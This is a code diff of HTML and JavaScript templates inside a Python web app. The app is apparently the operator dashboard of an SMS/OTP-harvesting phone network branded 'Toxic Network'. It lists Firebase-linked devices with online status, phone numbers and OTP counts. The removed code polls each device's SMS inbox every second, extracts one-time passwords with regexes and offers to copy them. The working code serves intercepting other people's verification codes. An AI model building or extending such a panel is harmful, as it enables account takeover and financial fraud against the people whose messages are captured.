   const r = await fetch('/api/firebases/bulk',{method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls})});
   const d = await r.json();
-  if(d.success){ showMsg('fb-msg',`✅ Added: ${d.added}, Skip: ${d.skipped}`,'ok'); document.getElementById('fb-bulk').value = ''; loadFirebases(); }
-  else showMsg('fb-msg','❌ '+(d.error||'Error'),'err');
+  if(d.success){ showMsg(`✅ Added: ${d.added}, Skipped: ${d.skipped}`, 'ok'); document.getElementById('fb-bulk').value = ''; loadFirebases(); }
+  else showMsg('❌ '+(d.error||'ERROR'), 'err');
 }
-function showMsg(id, text, type){ const el = document.getElementById(id); el.className = 'msg ' + type; el.textContent = text; if(type === 'ok') setTimeout(()=>{ el.className = 'msg'; }, 3000); }
 
 async function loadFirebases(){
-  document.getElementById('loading-text').style.display = 'block';
   try{
     const r = await fetch('/api/firebases'); const d = await r.json();
-    if(!d.success){ document.getElementById('loading-text').textContent = '❌ '+(d.error||'Error'); return; }
+    if(!d.success){ document.getElementById('fb-list').innerHTML = '<div class="empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
     firebases = d.firebases || [];
     document.getElementById('fb-count').textContent = firebases.length;
-    document.getElementById('loading-text').style.display = 'none';
-    renderFirebases(); updateSelectAll();
-  }catch(e){ document.getElementById('loading-text').textContent = '❌ Network error'; }
+    renderFirebases();
+  }catch(e){ document.getElementById('fb-list').innerHTML = '<div class="empty">❌ NETWORK ERROR</div>'; }
 }
 
-// ✅ Per-firebase online/offline count render
 function renderFirebases(){
   const box = document.getElementById('fb-list');
-  if(firebases.length === 0){ box.innerHTML = '<div class="empty">📭 No firebase added yet</div>'; return; }
+  if(firebases.length === 0){ box.innerHTML = '<div class="empty">📭 No firebases added yet</div>'; return; }
   box.innerHTML = firebases.map(f => {
     const isSel = selected.has(f.id);
-    const badge = f.source === 'personal_otp' ? '<span style="background:#d1fae5;color:#065f46;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:700">👤 USER</span>' : '<span style="background:#ede9fe;color:#6d28d9;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:700">👑 ADMIN</span>';
     const stats = f.stats || {online: 0, offline: 0, devices: 0};
+    const badge = f.source === 'personal_otp' ? '<span style="font-size:10px;background:rgba(139,92,246,.15);color:#8b5cf6;padding:2px 6px;border-radius:4px;font-weight:700">USER</span>' : '<span style="font-size:10px;background:rgba(239,68,68,.15);color:#ef4444;padding:2px 6px;border-radius:4px;font-weight:700">ROOT</span>';
+    
     return `
       <div class="fb-card">
-        <div class="checkbox ${isSel ? 'checked' : ''}" onclick="event.stopPropagation();toggleSelect('${f.id}')">${isSel ? '✓' : ''}</div>
+        <div class="checkbox ${isSel ? 'checked' : ''}" onclick="toggleSelect('${f.id}')">✓</div>
         <div class="fb-icon">🔥</div>
         <div class="fb-info" onclick="openFirebase('${f.id}')">
-          <div class="fb-name">${escapeHtml(f.name || 'unnamed')}${badge}</div>
-          <div class="fb-hash">🔒 ID: ${escapeHtml(f.hash || 'hidden')}</div>
+          <div class="fb-name">${escapeHtml(f.name || 'unnamed')} ${badge}</div>
+          <div class="fb-hash">ID: ${escapeHtml(f.hash || 'hidden')}</div>
           <div class="fb-counts">
-            <span class="fb-count-pill online"><span class="dot"></span>${stats.online} Online</span>
-            <span class="fb-count-pill offline"><span class="dot"></span>${stats.offline} Offline</span>
-            <span class="fb-count-pill devices">📱 ${stats.devices} Devices</span>
+            <span class="pill on">🟢 ${stats.online}</span>
+            <span class="pill off">🔴 ${stats.offline}</span>
+            <span class="pill dev">📱 ${stats.devices}</span>
           </div>
         </div>
-        <div class="fb-actions">
-          <button class="primary" onclick="event.stopPropagation();openFirebase('${f.id}')">Open</button>
-          <button class="danger" onclick="event.stopPropagation();removeOne('${f.id}')">🗑</button>
-        </div>
-      </div>
-    `;
+        <button class="btn gray" onclick="event.stopPropagation();removeOne('${f.id}')" style="padding:10px;border-radius:10px">🗑</button>
+      </div>`;
   }).join('');
 }
 
-function openFirebase(id){ window.location.href = '/firebase/' + id; }
-function toggleSelect(id){ if(selected.has(id)) selected.delete(id); else selected.add(id); renderFirebases(); updateSelectAll(); }
-function toggleSelectAll(){ if(selected.size === firebases.length) selected.clear(); else selected = new Set(firebases.map(f => f.id)); renderFirebases(); updateSelectAll(); }
-function updateSelectAll(){ const cb = document.getElementById('select-all-cb'); if(firebases.length > 0 && selected.size === firebases.length){ cb.classList.add('checked'); cb.textContent = '✓'; } else { cb.classList.remove('checked'); cb.textContent = ''; } }
-function closeConfirm(){ document.getElementById('confirm-overlay').classList.remove('show'); }
-function showConfirm(title, desc, onConfirm){
-  document.getElementById('confirm-title').textContent = title;
-  document.getElementById('confirm-desc').textContent = desc;
-  document.getElementById('confirm-overlay').classList.add('show');
-  const btn = document.getElementById('confirm-btn');
-  const newBtn = btn.cloneNode(true);
-  btn.parentNode.replaceChild(newBtn, btn);
-  newBtn.addEventListener('click', async ()=>{ closeConfirm(); await onConfirm(); });
-}
+function openFirebase(id){ window.location.href = '/supermasteradmin/firebase/' + id; }
+function toggleSelect(id){ if(selected.has(id)) selected.delete(id); else selected.add(id); renderFirebases(); }
+
 async function removeOne(id){
-  showConfirm('Delete this firebase?', 'This action cannot be undone', async ()=>{
-    const r = await fetch('/api/firebases/'+id, {method:'DELETE'}); const d = await r.json();
-    if(d.success){ toast('✅ Deleted'); selected.delete(id); loadFirebases(); }
-    else toast('❌ '+(d.error||'Error'));
-  });
+  if(!confirm('Delete this firebase?')) return;
+  const r = await fetch('/api/firebases/'+id, {method:'DELETE'}); const d = await r.json();
+  if(d.success){ toast('✅ Deleted'); selected.delete(id); loadFirebases(); }
+  else toast('❌ '+(d.error||'ERROR'));
 }
+
 async function removeSelected(){
   if(selected.size === 0) return toast('❌ Select at least one');
+  if(!confirm(`Delete ${selected.size} firebase(s)?`)) return;
   const ids = Array.from(selected);
-  showConfirm(`Delete ${ids.length} firebase(s)?`, 'Cannot be undone', async ()=>{
-    const r = await fetch('/api/firebases/bulk-delete', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ids})}); const d = await r.json();
-    if(d.success){ toast(`✅ Deleted: ${d.deleted}`); selected.clear(); loadFirebases(); }
-    else toast('❌ '+(d.error||'Error'));
-  });
+  const r = await fetch('/api/firebases/bulk-delete', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ids})}); const d = await r.json();
+  if(d.success){ toast(`✅ Deleted: ${d.deleted}`); selected.clear(); loadFirebases(); }
+  else toast('❌ '+(d.error||'ERROR'));
 }
+
 async function removeAll(){
   if(firebases.length === 0) return toast('❌ No firebases');
-  showConfirm(`Delete ALL ${firebases.length}?`, 'Cannot be undone!', async ()=>{
-    const r = await fetch('/api/firebases/all', {method:'DELETE'}); const d = await r.json();
-    if(d.success){ toast(`✅ Deleted all: ${d.deleted}`); selected.clear(); loadFirebases(); }
-    else toast('❌ '+(d.error||'Error'));
-  });
+  if(!confirm(`Delete ALL ${firebases.length} firebases?`)) return;
+  const r = await fetch('/api/firebases/all', {method:'DELETE'}); const d = await r.json();
+  if(d.success){ toast(`✅ Deleted all`); selected.clear(); loadFirebases(); }
+  else toast('❌ '+(d.error||'ERROR'));
 }
 function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
 
-checkConn();
 loadFirebases();
-setInterval(checkConn, 8000);
-// ✅ Auto refresh firebases every 15s so counts update
 setInterval(loadFirebases, 15000);
 </script>
-</body>
-</html>
+</body></html>
 """
-
 
 # ==================== FIREBASE VIEW HTML ====================
 FIREBASE_VIEW_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Firebase — Alex OTP</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Firebase</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#7c3aed">
-<style>""" + MOBILE_CSS + r"""
-body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
-.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
-.brand{font-size:16px;font-weight:800}
-.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
-@media(min-width:640px){.nav{order:0;width:auto}}
-.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:12px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center}
-.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
-.container{max-width:900px;margin:0 auto;padding:14px}
-.hero{background:#fff;border-radius:14px;padding:16px;margin-bottom:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.hero h1{font-size:16px;font-weight:800;color:#1e293b;margin-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
-.hero .hash{font-size:11px;color:#94a3b8;font-family:monospace;margin-bottom:14px}
-.hero-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px}
-.hs{background:#f8fafc;border-radius:10px;padding:12px;text-align:center}
-.hs b{display:block;font-size:20px;font-weight:800;color:#7c3aed;margin-bottom:2px}
-.hs span{font-size:10px;color:#94a3b8;text-transform:uppercase;font-weight:600;letter-spacing:.5px}
-.hs.online b{color:#16a34a}
-.hs.offline b{color:#dc2626}
-.hs.otp b{color:#a855f7}
-.list-header{display:flex;justify-content:space-between;align-items:center;margin:20px 0 12px;padding:0 4px}
-.list-header h2{font-size:14px;font-weight:700;color:#334155}
-.list-header .count{font-size:12px;color:#64748b;background:#e2e8f0;padding:3px 10px;border-radius:20px;font-weight:600}
-.search-box{margin-bottom:12px}
-.search-box input{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;outline:none;color:#1e293b}
-.num-card{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;min-height:70px}
-.num-card:active{transform:scale(.98);background:#fafafa}
-.num-icon{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#dcfce7,#bbf7d0);display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0}
-.num-icon.red{background:linear-gradient(135deg,#fee2e2,#fecaca)}
-.num-icon.gray{background:linear-gradient(135deg,#f1f5f9,#e2e8f0)}
-.num-info{flex:1;min-width:0}
-.num-title{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.num-title.unknown{color:#94a3b8;font-style:italic}
-.num-sub{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap}
-.num-sub .pill{background:#f1f5f9;padding:2px 7px;border-radius:6px;color:#64748b;font-size:10px;font-weight:600}
-.num-sub .pill.otp{background:#ede9fe;color:#7c3aed}
-.badge-online{display:flex;align-items:center;gap:5px;font-size:11px;color:#16a34a;font-weight:600;flex-shrink:0}
-.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
-.badge-offline{display:flex;align-items:center;gap:5px;font-size:11px;color:#dc2626;font-weight:600;flex-shrink:0}
-.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#dc2626}
-.arrow{color:#cbd5e1;font-size:20px}
-.card-actions{display:flex;gap:6px;flex-shrink:0}
-.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px}
-.inbox-header{background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
-.back-btn{background:#f1f5f9;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;cursor:pointer;color:#475569;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
-.inbox-num{font-size:16px;font-weight:800;color:#1e293b}
-.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#16a34a;font-weight:600;margin-top:2px}
-.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
-.inbox-status.offline{color:#dc2626}
-.inbox-status.offline .dot{background:#dc2626}
-.inbox-meta{font-size:11px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center}
-.refresh-icon{cursor:pointer;font-size:20px;color:#94a3b8;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
-.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;border-radius:12px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#92400e;box-shadow:0 2px 8px rgba(251,191,36,.2)}
-.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
-.top-number-badge .tn-info{flex:1;min-width:0}
-.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;letter-spacing:.5px;word-break:break-all}
-.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.8}
-.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;border-radius:8px;font-weight:800;font-size:11px}
-.sms-list{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.sms-item{padding:16px;border-bottom:1px solid #f1f5f9}
-.sms-item:last-child{border-bottom:none}
-.sms-item.fresh{background:linear-gradient(90deg,#f0fdf4,#fff 60%);border-left:4px solid #16a34a}
-.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
-.sender{font-size:12px;font-weight:800;color:#ef4444;display:flex;align-items:center;flex-wrap:wrap}
-.new-badge{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:10px;margin-left:6px}
-.sms-time{font-size:11px;color:#94a3b8}
-.sms-body{font-size:14px;color:#334155;line-height:1.55;word-break:break-word;white-space:pre-wrap}
-.otp-highlight{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;padding:2px 6px;border-radius:5px;font-weight:700}
-.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:20px;font-weight:700;font-size:12px;min-height:40px}
-.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
-.loading-text{text-align:center;padding:24px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
-.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#8b5cf6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
-@keyframes spin{to{transform:rotate(360deg)}}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none}
-.toast.show{transform:translateX(-50%) translateY(0)}
-.hidden{display:none !important}</style></head><body>
+<meta name="theme-color" content="#0f172a">
+<style>""" + PREMIUM_CSS + r"""
+.hero{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:24px;margin-bottom:20px}
+.hero h1{font-size:20px;font-weight:800;margin-bottom:6px;color:#f1f5f9}
+.hero .hash{font-size:12px;color:#94a3b8;margin-bottom:20px}
+.hero-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+.hs{background:#0f172a;border:1px solid #334155;border-radius:12px;padding:14px;text-align:center}
+.hs b{display:block;font-size:20px;font-weight:800;color:#3b82f6;margin-bottom:2px}
+.hs span{font-size:10px;color:#94a3b8;font-weight:700;text-transform:uppercase;letter-spacing:0.5px}
+.hs.on b{color:#10b981}
+.hs.off b{color:#ef4444}
+.hs.otp b{color:#8b5cf6}
+</style></head><body>
 
 <div class="topbar">
-<div class="brand"><span class="alex">Alex</span> — FIREBASE</div>
-<div class="nav"><a href="/admin/dashboard" class="nav-link">📱 Numbers</a><a href="/firebases" class="nav-link active">🔥 Firebases</a><a href="/admin/security" class="nav-link" style="background:#fef3c7;color:#92400e">🔒</a></div>
+<div class="brand">🔥 Toxic<span>Firebase</span></div>
+<a href="/supermasteradmin/firebases" style="padding:10px 16px;background:#334155;color:#f1f5f9;border-radius:10px;font-size:13px;font-weight:600;text-decoration:none">Back</a>
 </div>
 
 <div class="container">
 <div class="hero">
-<h1>🔥 <span id="fb-name">Loading...</span></h1>
-<div class="hash">🔒 ID: <span id="fb-hash">hidden</span></div>
+<h1 id="fb-name">Loading...</h1>
+<div class="hash">ID: <span id="fb-hash">...</span></div>
 <div class="hero-stats">
 <div class="hs"><b id="h-dev">0</b><span>Devices</span></div>
-<div class="hs online"><b id="h-on">0</b><span>Online</span></div>
-<div class="hs offline"><b id="h-off">0</b><span>Offline</span></div>
+<div class="hs on"><b id="h-on">0</b><span>Online</span></div>
+<div class="hs off"><b id="h-off">0</b><span>Offline</span></div>
 <div class="hs otp"><b id="h-otp">0</b><span>OTPs</span></div>
 </div>
 </div>
 
-<div id="list-view">
-<div class="loading-text" id="loading-text"><span class="spinner"></span>Loading...</div>
-<div id="list-content" class="hidden">
-<div class="search-box"><input id="search-num" placeholder="🔎 Search" oninput="renderNumbers()"></div>
-<div class="list-header"><h2>📱 Numbers</h2><span class="count" id="num-count">0</span></div>
+<div class="list-header">
+<h2>Numbers</h2>
+<span class="count" id="num-count">0</span>
+</div>
 <div id="num-list"></div>
 </div>
-</div>
-
-<div id="inbox-view" class="hidden">
-<div class="inbox-header">
-<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
-<div class="inbox-meta"><span>⚡ auto 1s · Latest 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">🔄</span></div>
-</div>
-<div id="top-number-badge" class="top-number-badge hidden">
-<div class="tn-icon">🏆</div>
-<div class="tn-info">
-<div class="tn-num" id="tn-num">-</div>
-<div class="tn-count">Sabse zyada baar aaya SMS me <span class="tn-highlight" id="tn-count-badge">0 bar</span></div>
-</div>
-</div>
-<div id="sms-container"></div>
-</div>
-</div>
-
-<div id="toast" class="toast"></div>
 
 <script>
 const FB_ID = "{{FB_ID}}";
 let numbers = [];
-let currentNum = null;
-let refreshTimer = null;
-let lastInboxSig = '';
-
-function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 1800); }
 
 async function loadFirebase(){
   try{
     const r = await fetch('/api/firebase/' + FB_ID); const d = await r.json();
-    if(!d.success){ document.getElementById('loading-text').innerHTML = '❌ '+(d.error||'Error'); return; }
+    if(!d.success){ document.getElementById('num-list').innerHTML = '❌ '+(d.error||'ERROR'); return; }
     document.getElementById('fb-name').textContent = d.name || 'unnamed';
     document.getElementById('fb-hash').textContent = d.hash || 'hidden';
     document.getElementById('h-dev').textContent = d.device_count;
@@ -2617,212 +2028,70 @@ async function loadFirebase(){
     document.getElementById('h-otp').textContent = d.otp_count;
     numbers = d.numbers || [];
     document.getElementById('num-count').textContent = numbers.length;
-    document.getElementById('loading-text').classList.add('hidden');
-    document.getElementById('list-content').classList.remove('hidden');
     renderNumbers();
-  }catch(e){ document.getElementById('loading-text').innerHTML = '❌ Network error'; }
+  }catch(e){ document.getElementById('num-list').innerHTML = '❌ NETWORK ERROR'; }
 }
 
 function renderNumbers(){
-  const q = (document.getElementById('search-num').value || '').toLowerCase();
   const box = document.getElementById('num-list');
-  const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
-  if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers</div>'; return; }
-  box.innerHTML = filtered.map(n => {
+  if(numbers.length === 0){ box.innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8">No numbers found</div>'; return; }
+  box.innerHTML = numbers.map(n => {
     const isOnline = n.online === true;
     const isUnknown = (n.number || '').startsWith('UNKNOWN-');
-    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
-    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
-    const badgeTxt = isOnline ? 'Online' : 'Offline';
+    const iconCls = isUnknown ? 'unknown-icon' : (isOnline ? '' : 'offline-icon');
+    const badgeCls = isOnline ? 'online' : 'offline';
     const titleCls = isUnknown ? 'unknown' : '';
+    const iconEmoji = isUnknown ? '❓' : (isOnline ? '📱' : '📴');
+    
     return `
       <div class="num-card">
-        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '❓' : '📶'}</div>
-        <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
+        <div class="num-icon ${iconCls}">${iconEmoji}</div>
+        <div class="num-info">
           <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
           <div class="num-sub">
-            <span class="pill">📨 ${n.msg_count} SMS</span>
+            <span class="pill">✉️ ${n.msg_count} SMS</span>
             ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
           </div>
         </div>
         <div class="card-actions">
-          <button class="raw-btn" onclick="event.stopPropagation();openRawData(${numbers.indexOf(n)})" title="Raw Data">🔍</button>
+          <button class="icon-btn purple" onclick="openRawData('${n.device_id}')" title="Raw Data" style="background:#8b5cf6">🔍</button>
         </div>
-        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
-      </div>
-    `;
+        <div class="badge ${badgeCls}">${isOnline ? 'Online' : 'Offline'}</div>
+      </div>`;
   }).join('');
 }
 
-function openRawData(idx){
-  if(idx < 0 || idx >= numbers.length) return;
-  const n = numbers[idx];
-  const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
+function openRawData(devId){
+  const url = '/supermasteradmin/debug?fb=' + encodeURIComponent(numbers.find(n=>n.device_id===devId)?.firebase || '') + '&id=' + encodeURIComponent(devId);
   window.open(url, '_blank');
-}
-
-function openInboxGlobal(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }
-
-async function openInbox(n){
-  currentNum = n; lastInboxSig = '';
-  document.getElementById('list-view').classList.add('hidden');
-  document.getElementById('inbox-view').classList.remove('hidden');
-  document.getElementById('inbox-num').textContent = n.number;
-  const statusEl = document.getElementById('inbox-status'); const statusTxt = document.getElementById('inbox-status-text');
-  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
-  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
-  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
-  await loadInbox(false);
-  if(refreshTimer) clearInterval(refreshTimer);
-  refreshTimer = setInterval(()=>loadInbox(false), 1000);
-}
-
-function findTopNumber(msgs){
-  const counter = {};
-  const senderNums = new Set();
-  msgs.forEach(m => {
-    const from = m.from || '';
-    const found = from.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => senderNums.add(n));
-  });
-  msgs.forEach(m => {
-    const text = m.message || '';
-    const found = text.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => {
-      if(senderNums.has(n)) return;
-      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
-      counter[n] = (counter[n] || 0) + 1;
-    });
-  });
-  let topNum = null, topCount = 0;
-  for(const [num, cnt] of Object.entries(counter)){
-    if(cnt > topCount){ topNum = num; topCount = cnt; }
-  }
-  return topNum ? {number: topNum, count: topCount} : null;
-}
-
-function updateTopNumberBadge(msgs){
-  const badge = document.getElementById('top-number-badge');
-  const top = findTopNumber(msgs);
-  if(top && top.count >= 2){
-    document.getElementById('tn-num').textContent = '📞 ' + top.number;
-    document.getElementById('tn-count-badge').textContent = top.count + ' bar';
-    badge.classList.remove('hidden');
-  } else {
-    badge.classList.add('hidden');
-  }
-}
-
-async function loadInbox(showLoader){
-  if(!currentNum) return;
-  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>'; }
-  const controller = new AbortController(); const timeoutId = setTimeout(() => controller.abort(), 15000);
-  try{
-    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
-    clearTimeout(timeoutId); const d = await r.json();
-    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ '+(d.error||'Error')+'</div>'; return; }
-    const msgs = d.messages || [];
-    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
-    if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(msgs); }
-  }catch(e){ clearTimeout(timeoutId); }
-}
-
-function renderMessages(msgs){
-  const box = document.getElementById('sms-container');
-  const now = Math.floor(Date.now() / 1000);
-  let list = [...msgs].sort((a, b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 60);
-  updateTopNumberBadge(list);
-  if(!list.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
-  box.innerHTML = '<div class="sms-list">' + list.map(m => {
-    const otp = m.otp || extractOtp(m.message);
-    const body = otp ? escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`) : escapeHtml(m.message);
-    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : '';
-    const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
-    const timeStr = m.date_string ? m.date_string : fmtTime(ts);
-    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
-    return `
-      <div class="sms-item ${isFresh?'fresh':''}">
-        <div class="sms-head">
-          <div class="sender">${escapeHtml(m.from || 'Unknown')} ${newBadge}</div>
-          <div class="sms-time">${escapeHtml(timeStr)}</div>
-        </div>
-        <div class="sms-body">${body}</div>
-        ${copyBtn}
-      </div>
-    `;
-  }).join('') + '</div>';
-}
-
-function backToList(){
-  document.getElementById('inbox-view').classList.add('hidden');
-  document.getElementById('list-view').classList.remove('hidden');
-  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
-  currentNum = null;
-}
-
-function extractOtp(text){
-  if(!text) return '';
-  const t = String(text);
-  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
-  if(m) return m[1];
-  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
-  if(m) return m[1];
-  m = t.match(/#(\d{4,8})/);
-  if(m) return m[1];
-  return '';
-}
-
-function fmtTime(ts){
-  if(!ts) return '';
-  try{
-    let t = parseInt(ts);
-    if(t > 1e12) t = Math.floor(t/1000);
-    if(t < 1e9) return String(ts);
-    const d = new Date(t * 1000);
-    const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
-    return d.toLocaleString('en-IN', opts).replace(',', ' |');
-  }catch(e){ return String(ts); }
-}
-
-function copyOtp(code){
-  const done = ()=>toast('✅ Copied: ' + code);
-  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(done).catch(()=>{ const ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
 }
 
 function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
 
 loadFirebase();
-setInterval(loadFirebase, 30000);
 </script>
-</body>
-</html>
+</body></html>
 """
-
 
 # ==================== DEBUG HTML ====================
 DEBUG_HTML = r"""<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>Raw Data Explorer</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif}
-body{background:#0f172a;color:#e2e8f0;min-height:100vh;padding:14px}
-.wrap{max-width:900px;margin:0 auto}
-h1{font-size:15px;font-weight:700;color:#a5b4fc;margin-bottom:6px}
-.sub{font-size:12px;color:#64748b;margin-bottom:14px;word-break:break-all}
-.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:12px;margin-bottom:10px;font-size:12px}
-.path{color:#fbbf24;font-weight:700;margin-bottom:6px;font-family:monospace;word-break:break-all}
-.status-ok{color:#4ade80;font-weight:600;margin-bottom:6px}
-.status-empty{color:#f87171;font-weight:600;margin-bottom:6px}
-.data{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:10px;color:#cbd5e1;font-family:monospace;font-size:10px;white-space:pre-wrap;word-break:break-word;max-height:400px;overflow-y:auto}
